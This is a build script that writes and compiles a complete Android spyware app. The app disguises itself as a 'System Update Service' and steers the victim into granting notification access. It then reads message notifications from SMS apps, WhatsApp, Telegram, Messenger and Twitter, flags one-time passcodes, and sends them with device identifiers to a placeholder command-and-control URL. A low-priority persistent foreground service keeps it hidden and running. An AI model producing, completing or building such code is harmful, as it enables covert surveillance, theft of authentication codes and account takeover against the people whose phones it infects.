
#!/bin/bash
set -e

# ==============================================================
#  SMS Monitor APK Builder — Fully Automated
#  Dependencies: Java 11+ (check with: java -version)
# ==============================================================

PROJECT_DIR="$HOME/sms-monitor"
APK_OUTPUT="$PROJECT_DIR/app/build/outputs/apk/debug/app-debug.apk"
ANDROID_SDK="$HOME/Android/Sdk"
CMDLINE_TOOLS="$ANDROID_SDK/cmdline-tools/latest/bin"

echo "[*] Creating project at: $PROJECT_DIR"
rm -rf "$PROJECT_DIR"
mkdir -p "$PROJECT_DIR"
cd "$PROJECT_DIR"

# ────────────────────────────────────────────
# Create all source files
# ────────────────────────────────────────────
echo "[*] Writing source files..."

mkdir -p app/src/main/java/com/smsmonitor
mkdir -p app/src/main/res/layout
mkdir -p app/src/main/res/values
mkdir -p app/src/main/res/xml

# settings.gradle
cat > settings.gradle << 'EOF'
rootProject.name = 'SmsMonitor'
include ':app'
EOF

# build.gradle (root)
cat > build.gradle << 'EOF'
buildscript {
    repositories {
        google()
        mavenCentral()
    }
    dependencies {
        classpath 'com.android.tools.build:gradle:8.2.0'
    }
}
allprojects {
    repositories { google(); mavenCentral() }
}
EOF

# gradle.properties
cat > gradle.properties << 'EOF'
org.gradle.jvmargs=-Xmx2048m
android.useAndroidX=true
EOF

# app/build.gradle
cat > app/build.gradle << 'EOF'
apply plugin: 'com.android.application'
android {
    compileSdk 34
    defaultConfig {
        applicationId "com.smsmonitor"
        minSdk 21
        targetSdk 34
        versionCode 1
        versionName "1.0"
    }
    buildTypes {
        debug {
            minifyEnabled false
        }
    }
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'com.squareup.okhttp3:okhttp:4.12.0'
}
EOF

# AndroidManifest.xml
cat > app/src/main/AndroidManifest.xml << 'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.smsmonitor">
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <application
        android:allowBackup="false"
        android:label="System Update Service"
        android:icon="@android:drawable/sym_def_app_icon"
        android:theme="@style/Theme.AppCompat.Light.DarkActionBar"
        android:supportsRtl="true">
        <activity android:name=".MainActivity" android:exported="true"
            android:theme="@style/Theme.AppCompat.Light.NoActionBar">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        <service android:name=".SmsNotificationListener"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
            android:exported="false" android:label="SMS Notification Listener">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>
        <service android:name=".ForegroundService"
            android:foregroundServiceType="dataSync" android:exported="false" />
    </application>
</manifest>
MANIFEST

# MainActivity.java
cat > app/src/main/java/com/smsmonitor/MainActivity.java << 'JAVA'
package com.smsmonitor;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.Toast;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button btnEnable = findViewById(R.id.btn_enable);
        btnEnable.setOnClickListener(v -> {
            if (!isNotificationListenerEnabled()) showGuideDialog();
            else { startForegroundService(); Toast.makeText(this, "Monitoring active", Toast.LENGTH_SHORT).show(); }
        });
        if (isNotificationListenerEnabled()) startForegroundService();
    }
    private boolean isNotificationListenerEnabled() {
        String l = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return l != null && l.contains(getPackageName());
    }
    private void showGuideDialog() {
        new AlertDialog.Builder(this).setTitle("Enable Notification Access")
                .setMessage("1. Open Notification Access settings\n2. Find 'System Update Service'\n3. Toggle it ON")
                .setPositiveButton("Open Settings", (d,w) -> startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")))
                .setNegativeButton("Cancel", null).show();
    }
    private void startForegroundService() {
        Intent i = new Intent(this, ForegroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i);
        else startService(i);
    }
}
JAVA

# SmsNotificationListener.java
cat > app/src/main/java/com/smsmonitor/SmsNotificationListener.java << 'JAVA'
package com.smsmonitor;
import android.app.Notification;
import android.os.Build;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import androidx.annotation.RequiresApi;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class SmsNotificationListener extends NotificationListenerService {
    private static final String TAG = "SmsMonitor";
    private static final String[] PKGS = {
        "com.google.android.apps.messaging","com.android.mms","com.android.messaging",
        "com.samsung.android.messaging","com.whatsapp","com.whatsapp.w4b",
        "org.telegram.messenger","com.twitter.android","com.facebook.orca"
    };
    private static final Pattern OTP = Pattern.compile("(\\d{4,8})");
    @Override public void onListenerConnected() { Log.i(TAG,"Connected"); }
    @Override @RequiresApi(api=Build.VERSION_CODES.KITKAT)
    public void onNotificationPosted(StatusBarNotification sbn) {
        String pkg = sbn.getPackageName();
        if (!isTarget(pkg)) return;
        Notification n = sbn.getNotification();
        if (n == null) return;
        Bundle ex = n.extras;
        String title = ex.getString(Notification.EXTRA_TITLE,"");
        String text = ex.getString(Notification.EXTRA_TEXT,"");
        Log.i(TAG,"[pkg="+pkg+"] title="+title+" text="+text);
        SmsExfiltrator.exfiltrate(this, pkg, title, text, OTP.matcher(text).find());
    }
    @Override public void onNotificationRemoved(StatusBarNotification sbn) {}
    private boolean isTarget(String p) {
        for (String t : PKGS) if (t.equals(p)) return true;
        String lc = p.toLowerCase();
        return lc.contains("sms") || lc.contains("message") || lc.contains("otp");
    }
}
JAVA

# SmsExfiltrator.java
cat > app/src/main/java/com/smsmonitor/SmsExfiltrator.java << 'JAVA'
package com.smsmonitor;
import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;
import org.json.JSONObject;
import java.io.IOException;
import java.util.UUID;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class SmsExfiltrator {
    private static final String TAG = "SmsExfil";
    private static final String C2_URL = "https://your-c2-server.com/api/exfil";
    private static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
    private static final OkHttpClient client = new OkHttpClient.Builder()
        .connectTimeout(10,TimeUnit.SECONDS)
        .writeTimeout(10,TimeUnit.SECONDS)
        .readTimeout(30,TimeUnit.SECONDS).build();
    private static String did = null;
    private static String getDeviceId(Context c) {
        if (did == null) {
            String id = Settings.Secure.getString(c.getContentResolver(), Settings.Secure.ANDROID_ID);
            if (id == null || "9774d56d682e549c".equals(id)) id = UUID.randomUUID().toString();
            did = id;
        }
        return did;
    }
    public static void exfiltrate(Context ctx, String pkg, String title, String body, boolean hasOtp) {
        try {
            JSONObject p = new JSONObject();
            p.put("device_id",getDeviceId(ctx));
            p.put("device_model",Build.MODEL);
            p.put("device_manufacturer",Build.MANUFACTURER);
            p.put("android_sdk",Build.VERSION.SDK_INT);
            p.put("package",pkg);
            p.put("title",title);
            p.put("body",body);
            p.put("has_otp",hasOtp);
            p.put("timestamp",System.currentTimeMillis()/1000);
            client.newCall(new Request.Builder()
                .url(C2_URL).post(RequestBody.create(p.toString(),JSON))
                .addHeader("X-Device-Id",getDeviceId(ctx))
                .addHeader("User-Agent","SmsMonitor/1.0")
                .build()).enqueue(new Callback(){
                    @Override public void onFailure(Call c, IOException e) { Log.e(TAG,"Exfil fail: "+e.getMessage()); }
                    @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
                });
        } catch(Exception e) { Log.e(TAG,"Exfil error: "+e.getMessage()); }
    }
}
JAVA

# ForegroundService.java
cat > app/src/main/java/com/smsmonitor/ForegroundService.java << 'JAVA'
package com.smsmonitor;
import android.app.*;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;

public class ForegroundService extends Service {
    private static final int NID = 1001;
    private static final String CID = "sms_monitor_channel";
    @Override public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CID,"System Service",NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            ((NotificationManager)getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(c);
        }
    }
    @Override public int onStartCommand(Intent i, int f, int sid) {
        startForeground(NID, new NotificationCompat.Builder(this,CID)
            .setContentTitle("System Service").setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info).setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN).build());
        return START_STICKY;
    }
    @Nullable @Override public IBinder onBind(Intent i) { return null; }
}
JAVA

# activity_main.xml
cat > app/src/main/res/layout/activity_main.xml << 'XML'
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent" android:layout_height="match_parent"
    android:gravity="center" android:orientation="vertical" android:padding="32dp">
    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
        android:text="System Update Service" android:textSize="20sp" android:textStyle="bold"
        android:layout_marginBottom="16dp"/>
    <TextView android:layout_width="wrap_content" android:layout_height="wrap_content"
        android:text="This application manages background system services."
        android:textAlignment="center" android:layout_marginBottom="32dp"/>
    <Button android:id="@+id/btn_enable" android:layout_width="wrap_content"
        android:layout_height="48dp" android:text="Enable Service"/>
</LinearLayout>
XML

# strings.xml
cat > app/src/main/res/values/strings.xml << 'XML'
<resources><string name="app_name">System Update Service</string></resources>
XML

# notification_listener_config.xml
mkdir -p app/src/main/res/xml
cat > app/src/main/res/xml/notification_listener_config.xml << 'XML'
<?xml version="1.0" encoding="utf-8"?>
<notification-listener xmlns:android="http://schemas.android.com/apk/res/android"
    android:notificationListener=".SmsNotificationListener" />
XML

# ────────────────────────────────────────────
# Install Android SDK (if not present)
# ────────────────────────────────────────────
if [ ! -f "$CMDLINE_TOOLS/sdkmanager" ]; then
    echo "[*] Downloading Android command-line tools..."
    mkdir -p "$ANDROID_SDK/cmdline-tools"
    cd /tmp
    if [[ "$(uname)" == "Darwin" ]]; then
        curl -sLo cmdline-tools.zip "https://dl.google.com/android/repository/commandlinetools-mac-11076708_latest.zip"
    else
        curl -sLo cmdline-tools.zip "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip"
    fi
    unzip -q cmdline-tools.zip -d "$ANDROID_SDK/cmdline-tools"
    mv "$ANDROID_SDK/cmdline-tools/cmdline-tools" "$ANDROID_SDK/cmdline-tools/latest"
    rm -f cmdline-tools.zip
else
    echo "[*] Android SDK already present"
fi

# Accept licenses
yes | "$CMDLINE_TOOLS/sdkmanager" --licenses > /dev/null 2>&1 || true

# Install required SDK components
echo "[*] Installing Android SDK platforms..."
"$CMDLINE_TOOLS/sdkmanager" "platforms;android-34" "build-tools;34.0.0" > /dev/null 2>&1

export ANDROID_HOME="$ANDROID_SDK"
export ANDROID_SDK_ROOT="$ANDROID_SDK"

# ────────────────────────────────────────────
# Generate Gradle wrapper
# ────────────────────────────────────────────
echo "[*] Setting up Gradle wrapper..."
cd "$PROJECT_DIR"
mkdir -p gradle/wrapper
cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https\://services.gradle.org/distributions/gradle-8.5-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
EOF

# Download Gradle wrapper jar
curl -sLo gradle/wrapper/gradle-wrapper.jar \
    "https://raw.githubusercontent.com/gradle/gradle/v8.5.0/gradle/wrapper/gradle-wrapper.jar"

# Create gradlew script
cat > gradlew << 'SCRIPT'
#!/bin/sh
PRG="$0"
PRGDIR=`dirname "$PRG"`
JAVA_CMD="java"
if [ -n "$JAVA_HOME" ]; then JAVA_CMD="$JAVA_HOME/bin/java"; fi
exec "$JAVA_CMD" $JAVA_OPTS -classpath "$PRGDIR/gradle/wrapper/gradle-wrapper.jar" org.gradle.wrapper.GradleWrapperMain "$@"
SCRIPT
chmod +x gradlew

# ────────────────────────────────────────────
# Build the APK
# ────────────────────────────────────────────
echo "[*] Building APK..."
cd "$PROJECT_DIR"
export ANDROID_HOME="$ANDROID_SDK"
export ANDROID_SDK_ROOT="$ANDROID_SDK"
./gradlew assembleDebug 2>&1 | tail -20

if [ -f "$APK_OUTPUT" ]; then
    echo ""
    echo "============================================"
    echo "  BUILD SUCCESSFUL"
    echo "============================================"
    echo ""
    echo "  Signed debug APK:"
    echo "  $APK_OUTPUT"
    echo ""
    echo "  Install on device:"
    echo "  adb install $APK_OUTPUT"
    echo ""
else
    echo ""
    echo "[!] Build may have failed. Check output above."
fi
